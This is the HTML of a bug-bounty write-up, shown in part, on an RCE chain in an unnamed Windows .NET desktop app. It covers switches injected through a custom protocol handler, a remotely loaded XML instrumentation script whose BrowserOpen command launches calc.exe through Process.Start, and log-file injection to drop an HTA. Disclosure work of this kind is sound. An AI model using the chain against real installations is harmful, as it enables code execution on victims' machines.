@@ -1,0 +1,763 @@
+<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1">
+<link href=/css/fonts.css rel=stylesheet type=text/css>
+<title>Attack Surface Analysis - Part 3 - Resurrected Code Execution</title>
+<link rel=stylesheet href=/css/hugo-octopress.css>
+<link rel=stylesheet href=/css/fork-awesome.min.css>
+<link href=https://parsiya.net/favicon.png rel=icon>
+<meta name=description content>
+<meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]">
+<meta name=author content="Parsia">
+<meta name=generator content="Hugo 0.92.0">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image:src content="https://parsiya.net/blog/2021-09-26-attack-surface-analysis-part-3-resurrected-code-execution/03-powerglove-rce.jpg">
+<meta name=twitter:title content="Attack Surface Analysis - Part 3 - Resurrected Code Execution">
+<meta name=twitter:description content="In part 3 of my attack surface analysis series, I will discuss an undisclosed RCE.
+This bug uses a combination of all tricks introduced in
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+part 2 of the series.
+We will see command-line switch injection from a custom protocol handler,
+loading remote files, reversing a custom scripting engine to instrument the
+application, and log file injection. Pretty nice chain if I may say so.">
+<meta name=twitter:domain content="parsiya.net">
+<meta name=twitter:creator content="@CryptoGangsta">
+</head>
+<body>
+<header role=banner>
+<hgroup>
+<h1><a href=https://parsiya.net/>Hackerman's Hacking Tutorials</a></h1>
+<h2>The knowledge of anything, since all things have causes, is not acquired or
+complete unless it is known by its causes. - Avicenna</h2>
+</hgroup></header>
+<nav role=navigation>
+<fieldset class=mobile-nav>
+<select onchange="location=this.value"><option value>Navigate…</option><option value=https://parsiya.net/about/>» About Me!</option><option value=https://parsiya.net/cheatsheet/>» Cheat Sheet</option><option value=https://parsiya.io/>» My Clone</option><option value=https://github.com/parsiya/parsiya.net>» Source Repo</option><option value="https://queue.acm.org/detail.cfm?id=3197520">» Manual Work is a Bug</option><option value="https://www.google.com/search?q=andrew+ridgeley">» The Other Guy from Wham!</option></select>
+</fieldset>
+<ul class=main-navigation>
+<li><a href=https://parsiya.net/about/ title="About Me!" target=_blank rel="noopener noreferrer">About Me!</a></li>
+<li><a href=https://parsiya.net/cheatsheet/ title="Cheat Sheet" target=_blank rel="noopener noreferrer">Cheat Sheet</a></li>
+<li><a href=https://parsiya.io/ title="My Clone" target=_blank rel="noopener noreferrer">My Clone</a></li>
+<li><a href=https://github.com/parsiya/parsiya.net title="Source Repo" target=_blank rel="noopener noreferrer">Source Repo</a></li>
+<li><a href="https://queue.acm.org/detail.cfm?id=3197520" title="Manual Work is a Bug" target=_blank rel="noopener noreferrer">Manual Work is a Bug</a></li>
+<li><a href="https://www.google.com/search?q=andrew+ridgeley" title="The Other Guy from Wham!" target=_blank rel="noopener noreferrer">The Other Guy from Wham!</a></li>
+</ul>
+<ul class=subscription>
+<a href=https://parsiya.net/index.xml target=_blank type=application/rss+xml title=RSS rel="noopener noreferrer"><i class="fa fa-rss-square fa-lg"></i></a>
+</ul>
+<form action=https://www.google.com/search method=get target=_blank rel="noopener noreferrer">
+<fieldset role=search>
+<input class=search type=text name=q results=0 placeholder=Search>
+<input type=hidden name=q value=site:https://parsiya.net/>
+</fieldset>
+</form>
+</nav>
+<div id=main>
+<div id=content>
+<div>
+<article class=hentry role=article>
+<header>
+<p class=meta>Sep 26, 2021
+- 16 minute read
+- <a href=https://parsiya.net/blog/2021-09-26-attack-surface-analysis-part-3-resurrected-code-execution/#disqus_thread>Comments</a>
+- <a class=label href=https://parsiya.net/categories/attack-surface-analysis/>Attack Surface Analysis </a>
+</p>
+<h1 class=entry-title>
+Attack Surface Analysis - Part 3 - Resurrected Code Execution
+</h1>
+</header>
+<div class=entry-content>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#summary>Summary</a></li>
+<li><a href=#introduction>Introduction</a>
+<ul>
+<li><a href=#some-history>Some History</a></li>
+</ul>
+</li>
+<li><a href=#the-original-bug>The Original Bug</a>
+<ul>
+<li><a href=#protocol-handlers>Protocol Handlers</a></li>
+<li><a href=#command-line-switches>Command-Line Switches</a></li>
+<li><a href=#login>Login</a></li>
+<li><a href=#output-file>Output File</a></li>
+<li><a href=#loading-remote-files>Loading Remote Files</a></li>
+<li><a href=#custom-script>Custom Script</a></li>
+<li><a href=#browseropen>BrowserOpen</a>
+<ul>
+<li><a href=#popping-calc>Popping Calc</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href=#rce-rejected-code-execution>RCE: Rejected Code Execution</a>
+<ul>
+<li><a href=#tavisos-similar-bug>TavisO's Similar Bug</a></li>
+</ul>
+</li>
+<li><a href=#rce-resurrected-code-execution>RCE: Resurrected Code Execution</a>
+<ul>
+<li><a href=#exploitation>Exploitation</a></li>
+<li><a href=#user-gesture-required>User Gesture Required</a></li>
+</ul>
+</li>
+<li><a href=#what-did-we-learn-here-today>What Did We Learn Here Today?</a></li>
+</ul>
+</nav>
+<p>In part 3 of my attack surface analysis series, I will discuss an undisclosed RCE.
+This bug uses a combination of all tricks introduced in
+<a href=/blog/2021-03-17-attack-surface-analysis-part-2-custom-protocol-handlers/ title="Attack Surface Analysis - Part 2 - Custom Protocol Handlers" rel=nofollow target=_blank>part 2 of the series</a>.</p>
+<p>We will see command-line switch injection from a custom protocol handler,
+loading remote files, reversing a custom scripting engine to instrument the
+application, and log file injection. Pretty nice chain if I may say so.</p>
+<p><strong>Previously on Attack Surface Analysis</strong></p>
+<ul>
+<li>
+<a href=/blog/2021-01-08-attack-surface-analysis-part-1-application-update-a-novel-way-to-bypass-executable-signature-checks-with-electron/ title="Attack Surface Analysis - Part 1 - Application Update: 'A Novel Way to Bypass Executable Signature Checks with Electron" rel=nofollow target=_blank>Attack Surface Analysis - Part 1 - Application Update: 'A Novel Way to Bypass Executable Signature Checks with Electron</a></li>
+<li>
+<a href=/blog/2021-03-17-attack-surface-analysis-part-2-custom-protocol-handlers/ title="Attack Surface Analysis - Part 2 - Custom Protocol Handlers" rel=nofollow target=_blank>Attack Surface Analysis - Part 2 - Custom Protocol Handlers</a></li>
+</ul>
+<h1 id=summary>Summary
+<a class=header-link href=#summary><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>We can abuse two similar command-line switches. Each has two parameters. One is
+an XML file that is a script for the app's internal instrumentation engine
+(e.g., make the app do things like click buttons) and the second one is an
+output file that stores the result script's execution.</p>
+<p>I found a command named <code>BrowserOpen</code> in the instrumentation engine that takes a
+URI and runs it with <code>Process.Start(string)</code>. This allows us to run any local
+executable but without parameters. The instrumentation engine can pop calc if it
+runs this script.</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+    <span style=color:#268bd2>&lt;BrowserOpen</span> URI=<span style=color:#2aa198>&#34;C:/Windows/System32/calc.exe&#34;</span> <span style=color:#268bd2>/&gt;</span>
+<span style=color:#268bd2>&lt;/MyRoot&gt;</span>
+</code></pre></div><p>We can abuse get some limited remote code execution in the application because
+of the following:</p>
+<ul>
+<li>The application registers a custom protocol handler. We can pass any
+switch/parameters to the application.</li>
+<li>The script file can be remote (it's the same for log files but that is not
+useful here).</li>
+</ul>
+<p>I filed two bugs (one for each switch), I could pass a remote file and run an
+executable without any parameters. Neither was accepted because of this
+limitation and I almost gave up.</p>
+<p>While reading the part 2 of this series, I remembered that if the script
+contains an error, the output file has the complete line that has caused the
+error.</p>
+<p>This enabled me to use the technique in the Google Web Designer log injection
+bug to write an HTA to the victim's file system at a location of my choice.
+Then, I could abuse the same functionality to execute the HTA with a separate
+protocol handler invocation.</p>
+<p>Thus, the RCE was resurrected.</p>
+<h1 id=introduction>Introduction
+<a class=header-link href=#introduction><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>In December 2020 and January 2021, I spent around 100 hours on a program with a
+.NET thickclient. Programs usually do not have desktop applications in scope so
+it was a welcome surprise. I ended up submitting five bugs for a total of $8500
+(not my greatest payday but good for roughly 100 hours of hunting). Some
+limited info:</p>
+<ul>
+<li><a href=https://twitter.com/CryptoGangsta/status/1367762486934446083 target=_blank rel="noreferrer noopener">Bug #1 - 2K</a>: This was out of scope but I explained how this is an
+issue and they gave me a bounty.</li>
+<li><a href=https://twitter.com/CryptoGangsta/status/1362799006514966530 target=_blank rel="noreferrer noopener">Bug #2 - 2K</a>: I literally asked the security team what they cared about
+and then went and found it. Open communication helps.</li>
+<li><a href=https://twitter.com/CryptoGangsta/status/1359058979033284608 target=_blank rel="noreferrer noopener">Bug #3 - 1.5K</a>: I found the WSDL and it had an API call to create admin
+users. Normal users could call it.</li>
+<li><a href=https://twitter.com/CryptoGangsta/status/1352818412213309441 target=_blank rel="noreferrer noopener">Bug #4 - 1.5K</a>: Similar to the above, I proxied the thickclient and
+found I could call APIs that I should not.</li>
+<li>Bug #5 - 1.5K : This one.</li>
+</ul>
+<h2 id=some-history>Some History
+<a class=header-link href=#some-history><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>I found two remote code execution bugs in the program. Both were rejected (we
+will see later why). Initially, I started the previous installment of this
+series to explain <a href=https://twitter.com/CryptoGangsta/status/1369844949651361794 target=_blank rel="noreferrer noopener">these useless RCEs</a>, but the blog turned
+into a long review.</p>
+<p>I read about the
+<a href=/blog/2021-03-17-attack-surface-analysis-part-2-custom-protocol-handlers/#google-web-designer-command-injection-via-the-log-file title="Google Web Designer Command Injection via The Log File" rel=nofollow target=_blank>Google Web Designer Command Injection via The Log File</a>
+bug and realized I can use it to resurrect this bug. This blog will explain
+how I found this bug, what techniques I used (spoiler: pretty much everything
+from part 2), why it was initially rejected, and how I resurrected it.</p>
+<h1 id=the-original-bug>The Original Bug
+<a class=header-link href=#the-original-bug><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>Without further ado, let's talk about what I initially found.</p>
+<h2 id=protocol-handlers>Protocol Handlers
+<a class=header-link href=#protocol-handlers><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>The program installs four custom protocol handlers. This was
+obvious because the application launched its tutorial with a URI immediately
+after installation. E.g., <code>appHandler://-showTutorial [GUID]</code>.</p>
+<p>Using <a href=https://www.nirsoft.net/utils/url_protocol_view.html target=_blank rel="noreferrer noopener">URLProtocolView</a> by Nirsoft I looked at the
+command-line for the handlers:</p>
+<ul>
+<li><code>C:\Program Files\company\app\app.exe %L</code></li>
+</ul>
+<p><code>%L</code> is not a common switch. It means "long file name form of the first
+parameter." Think of it as "a long string that is passed to the app." I am not
+sure how it is different from <code>%1</code>.</p>
+<p>Note the URI handler is not quoted. It doesn't matter here. The app parses the
+URI and extracts the switches:</p>
+<ol>
+<li>Click <code>bleh://-switch1 value1 -switch2 value2</code> in the browser.</li>
+<li>App is executed as <code>app.exe bleh://-switch1 value1 -switch2 value2</code>.</li>
+<li>App extracts the switches and runs as <code>app.exe -switch1 value1 -switch2 value2</code>.</li>
+</ol>
+<h2 id=command-line-switches>Command-Line Switches
+<a class=header-link href=#command-line-switches><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>If we find a vulnerable command-line switch in such an app, we can launch a
+remote attack using the protocol handler.</p>
+<p>Running the app with some dummy switches (e.g., <code>app.exe --whatever</code>) displayed
+a usage dialog with a list of switches. I realized the app has hidden switches
+that are not shown because this list did not include the <code>showTutorial</code> switch
+that I had seen before.</p>
+<p>Fortunately, this was a .NET app. I started debugging it with dnSpy. The main
+binary and some DLLs were obfuscated but I was looking for specific strings.
+While debugging, I saw the app compares switches from input against a list of
+valid ones.</p>
+<blockquote>
+<p>Every computer science problem can be reduced to string comparison.</p>
+<footer>
+<strong>Parsia</strong>
+<cite>Self quote (lol)</cite>
+</footer>
+</blockquote>
+<p>This was done in <code>System.Core.dll > namespace System.Linq</code>. By putting a
+breakpoint in the following function, I could see every valid switch in the
+value of <code>source</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=color:#719e07>public</span> <span style=color:#719e07>static</span> TSource FirstOrDefault&lt;TSource&gt;(<span style=color:#719e07>this</span> IEnumerable&lt;TSource&gt; source, Func&lt;TSource, <span style=color:#dc322f>bool</span>&gt; predicate)
+{
+    <span style=color:#719e07>if</span> (source == <span style=color:#719e07>null</span>)
+    {
+        <span style=color:#719e07>throw</span> Error.ArgumentNull(<span style=color:#2aa198>&#34;source&#34;</span>);
+    }
+    <span style=color:#719e07>if</span> (predicate == <span style=color:#719e07>null</span>)
+    {
+        <span style=color:#719e07>throw</span> Error.ArgumentNull(<span style=color:#2aa198>&#34;predicate&#34;</span>);
+    }
+    <span style=color:#719e07>foreach</span> (TSource tsource <span style=color:#719e07>in</span> source)
+    {
+        <span style=color:#719e07>if</span> (predicate(tsource)) <span style=color:#586e75>// BREAKPOINT HERE!!!
+</span><span style=color:#586e75></span>        {
+            <span style=color:#719e07>return</span> tsource;
+        }
+    }
+    <span style=color:#719e07>return</span> <span style=color:#719e07>default</span>(TSource);
+}
+</code></pre></div><p>The app had 55 switches and the usage string only showed 30. In such situations,
+you need to carefully examine each "hidden switch" because they might do
+something naughty. I discovered three that were promising. One was used to
+<a href=https://twitter.com/CryptoGangsta/status/1367762486934446083 target=_blank rel="noreferrer noopener">bypass a client-side protection</a> (not related to this bug). The other
+two resulted in this RCE. They look like this (obviously fake names):</p>
+<ul>
+<li><code>-script scriptSource.xml output.xml</code></li>
+<li><code>-debug  scriptSource.xml output.xml server username password</code></li>
+</ul>
+<p>They both do the same thing:</p>
+<ol>
+<li><code>debug</code> tries to log in to the <code>server</code> with <code>username:password</code>.</li>
+<li>Both, process and run <code>scriptSource.xml</code>.</li>
+<li>Both, store the output of the script in <code>output.xml</code>. E.g., a success message
+or errors if any.</li>
+</ol>
+<h2 id=login>Login
+<a class=header-link href=#login><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p><code>debug</code> tries to log in to the server before doing anything. If it is not
+successful, the script is not executed. I realized the app does not really do
+anything after sending the login request and thinks it has logged in after
+receiving some canned responses. I set up a local Python3 server to simulate a
+login and the app was tricked into thinking it has completed the login sequence.
+We can create our own dummy server and pass it in the parameters to make this
+work.</p>
+<p>After the login, both switches are the same so I will use <code>-script</code> for the rest
+of the post.</p>
+<h2 id=output-file>Output File
+<a class=header-link href=#output-file><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>This output file is really useful. It contains the result of the script's
+execution. E.g., if I passed an empty file like
+<code>app.exe -script empty.xml output.txt</code>, I would get this helpful error in
+<code>output.txt</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs>Script Failed:
+  System.Xml.XmlException: Root element <span style=color:#719e07>is</span> missing.
+   at System.Xml.XmlTextReaderImpl.Throw(Exception e)
+   at System.Xml.XmlTextReaderImpl.ParseDocumentContent()
+   at System.Xml.Linq.XDocument.Load(XmlReader reader, LoadOptions options)
+   at System.Xml.Linq.XDocument.Load(String uri, LoadOptions options)
+   at [redacted]
+
+Current Step:
+    Unknown
+</code></pre></div><p>This means the script needs to be an XML file. Although, we already knew that
+from the usage string for this switch (the extension of the file was <code>xml</code> in
+the example).</p>
+<h2 id=loading-remote-files>Loading Remote Files
+<a class=header-link href=#loading-remote-files><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>I wanted to see if the app accepts UNC paths. I passed a non-existing UNC path
+to it and saw this error in the output file that confirmed my theory:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs>System.IO.IOException: The network path was not found.
+  at System.IO.<span style=color:#2aa198>__</span>Error.WinIOError(Int32 errorCode, String maybeFullPath)
+  at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access,
+    Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize,
+    FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath,
+    Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)
+  at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share)
+  at [redacted]
+</code></pre></div><p>Both files for these two switches can be remote.</p>
+<h2 id=custom-script>Custom Script
+<a class=header-link href=#custom-script><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>The <code>scriptSource</code> file is passed to the custom scripting engine of the
+application. We can use this to instrument the application. That is how the
+app's tutorial walks the users through a simple workflow. We can use it to
+perform actions in the application (e.g., click buttons). I passed a dummy XML
+file to see how it behaves (mainly to see the error in the output file).</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#268bd2>&lt;Root&gt;</span>
+    <span style=color:#268bd2>&lt;child</span> <span style=color:#268bd2>/&gt;</span>
+<span style=color:#268bd2>&lt;/Root&gt;</span>
+</code></pre></div><p>And I got this error:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs>Script Failed:
+    System.InvalidOperationException: Unknown tag: Root
+   at [redacted]
+
+Current Step:
+    Unknown
+</code></pre></div><p>This stack trace pointed me to the location where the app was checking the root
+tag. I put a breakpoint in the chain and debugged the app with dnSpy, I was able
+to find the expected name of the root tag (remember what I said about reducing
+every problem to string comparison?). Let's call the root tag <code>MyRoot</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=color:#719e07>private</span> <span style=color:#719e07>void</span> runCommands(XDocument nfc)
+{
+    <span style=color:#586e75>// Code Removed
+</span><span style=color:#586e75></span>    <span style=color:#586e75>// Check if the root tag is named &#34;MyRoot&#34;
+</span><span style=color:#586e75></span>    <span style=color:#719e07>if</span> (nfc.Root.Name.ToString() != <span style=color:#2aa198>&#34;MyRoot)
+</span><span style=color:#2aa198></span>    {
+        <span style=color:#586e75>// If not, return an error.
+</span><span style=color:#586e75></span>        XName name = nfc.Root.Name;
+        <span style=color:#719e07>throw</span> <span style=color:#719e07>new</span> InvalidOperationException(...);
+    }
+    <span style=color:#586e75>// If the root tag is MyRoot, continue.
+</span><span style=color:#586e75></span>    <span style=color:#719e07>foreach</span> (XElement xelement <span style=color:#719e07>in</span> nfc.Root.Elements())
+    {
+        <span style=color:#586e75>// parse each child tag
+</span><span style=color:#586e75></span>
+        <span style=color:#586e75>// a very long switch/case structure that compares the name of each
+</span><span style=color:#586e75></span>        <span style=color:#586e75>// child tag with the command names.
+</span></code></pre></div><p>Turns out the format of the XML file is very simple. Each command is a separate
+child of the root tag. Something like this:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+    <span style=color:#268bd2>&lt;Cmd1</span> <span style=color:#268bd2>/&gt;</span>
+    <span style=color:#268bd2>&lt;Cmd2</span> <span style=color:#268bd2>/&gt;</span>
+<span style=color:#268bd2>&lt;/MyRoot&gt;</span>
+</code></pre></div><p>Discovering the name of the commands (e.g., <code>Cmd1</code>) was another string
+comparison problem. I already knew where the root tag was compared so I could
+continue debugging from that point. The engine had 22 possible commands.</p>
+<p>I realized the scripting engine is used to instrument the app without user
+interaction. For example, there was a command named <code>TutorialButtonClick</code>.</p>
+<h2 id=browseropen>BrowserOpen
+<a class=header-link href=#browseropen><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>I went through all the commands but most resulted in a crash. Until I got to
+<code>BrowserOpen</code> (fake name again). The following code executes this tag. It checks
+if the tag has a URI attribute. If so, it's converted to a URI and passed to the
+<code>Runtime.Instance.Open</code> method:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=color:#586e75>// The original code was obfuscated so I renamed some variables to make it easier to read.
+</span><span style=color:#586e75></span><span style=color:#719e07>private</span> <span style=color:#719e07>void</span> runBrowserOpen(XElement command)
+{
+    <span style=color:#586e75>// Get the value of the &#34;URI&#34; attribute.
+</span><span style=color:#586e75></span>    tempURI = command.GetAttribute(<span style=color:#2aa198>&#34;URI&#34;</span>);
+    <span style=color:#586e75>// If the value of the &#34;URI&#34; is not null, do the following.
+</span><span style=color:#586e75></span>    <span style=color:#719e07>if</span> (tempURI != <span style=color:#719e07>null</span>)
+    {
+        Runtime.Instance.Open(<span style=color:#719e07>new</span> Uri(attribute));
+    }
+}
+</code></pre></div><p>So our XML should look like this:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+    <span style=color:#268bd2>&lt;BrowserOpen</span> URI=<span style=color:#2aa198>&#34;something&#34;</span> <span style=color:#268bd2>/&gt;</span>
+<span style=color:#268bd2>&lt;/MyRoot&gt;</span>
+</code></pre></div><p>The input must satisfy the <code>Uri(input)</code> constructor. If there is an error,
+execution is stopped and the app prints a stack trace and error line to the
+output file.</p>
+<p>The <code>Open</code> method does this.</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=color:#719e07>public</span> <span style=color:#719e07>virtual</span> <span style=color:#719e07>void</span> Open(Uri uri)
+{
+    <span style=color:#719e07>try</span>
+    {
+        OpenFileOrUrl(uri);
+    }
+    <span style=color:#719e07>catch</span> (Exception ex)
+    {
+        <span style=color:#586e75>// Handle the exception.
+</span><span style=color:#586e75></span>    }
+}
+</code></pre></div><p><code>OpenFileOrUrl</code> (below) is straightforward and has a programming bug (see if you
+can spot it). If the platform is not Windows, it calls
+<code>Process.Start("open", URI)</code>. I am not sure if this line is also vulnerable to
+command injection or not. The app is only available on Windows so I did not look
+into it.</p>
+<p>On Windows, the app first checks if the incoming URI has the <code>http</code> or <code>https</code>
+scheme with <code>IsPathForBrowser</code>. If not, it calls <code>Process.Start(URI)</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=color:#719e07>private</span> <span style=color:#719e07>void</span> OpenFileOrUrl(<span style=color:#dc322f>string</span> pathOrUri)
+{
+    <span style=color:#719e07>if</span> (Runtime.IsOSPlatform(OSPlatform.Windows))
+    {
+        <span style=color:#719e07>try</span>
+        {
+            <span style=color:#586e75>// This checks if the scheme is http or https.
+</span><span style=color:#586e75></span>            <span style=color:#719e07>if</span> (!IsPathForBrowser(pathOrUri))
+            {
+                Process.Start(pathOrUri);
+                <span style=color:#719e07>return</span>;
+            }
+        }
+        <span style=color:#719e07>catch</span> (Exception exception)
+        {
+            <span style=color:#586e75>// Handle exception
+</span><span style=color:#586e75></span>        }
+        <span style=color:#586e75>// This is executed if the scheme is http or https. E.g., if we pass a URL.
+</span><span style=color:#586e75></span>        <span style=color:#586e75>// This will open the URL in the system&#39;s default browser.
+</span><span style=color:#586e75></span>        Process.Start(<span style=color:#2aa198>&#34;explorer.exe&#34;</span>, pathOrUri.SurroundedInQuotes());
+        <span style=color:#719e07>return</span>;
+    }
